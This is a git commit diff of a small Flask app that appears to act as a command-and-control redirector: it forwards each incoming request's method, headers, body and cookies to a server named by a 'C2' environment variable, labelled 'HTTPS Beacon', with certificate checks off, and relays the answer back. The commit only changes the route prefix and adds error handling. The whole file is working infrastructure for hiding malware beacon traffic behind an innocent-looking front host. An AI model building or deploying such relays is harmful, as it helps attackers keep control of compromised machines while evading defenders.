8c69fc0aafa4d05f7276f03f9e786e1665e9b3d8
CoCo ainrm- <137618329@qq.com>
2023-04-27 17:12:57 +0800

    Update index.py

--- api/index.py
+++ api/index.py
@@ -8,28 +8,31 @@ app = Flask(__name__)
 def example():
     return 'ok'
 
-@app.route('/<path:path>', methods=['POST','GET'])
+@app.route('/api/<path:path>', methods=['POST','GET'])
 def main_handler(path):
-    C2 = 'https://' + os.getenv('C2') + '/' # HTTPS Beacon
+    C2 = 'https://' + os.getenv('C2') # HTTPS Beacon
 
     headers = {}
     for key, value in request.headers.items():
         if key not in ['Host', 'Content-Length']:
             headers[key] = value
 
-    req = requests.request(
-        method = request.method,
-        url = C2 + path,
-        headers = headers,
-        data = request.get_data(),
-        cookies = request.cookies,
-        verify=False,
-        allow_redirects=False
-        )
+    try:
+        req = requests.request(
+            method = request.method,
+            url = C2 + '/api/' +path,
+            headers = headers,
+            data = request.get_data(),
+            cookies = request.cookies,
+            verify=False,
+            allow_redirects=False
+            )
 
-    rsp_headers = {}
-    for key, value in req.headers.items():
-        if key not in ['Date', 'Connection', 'Server']:
-            rsp_headers[key] = value
+        rsp_headers = {}
+        for key, value in req.headers.items():
+            if key not in ['Date', 'Connection', 'Server']:
+                rsp_headers[key] = value
 
-    return req.text, req.status_code, rsp_headers.items()
+        return req.text, req.status_code, rsp_headers.items()
+    except:
+        return 'request err'
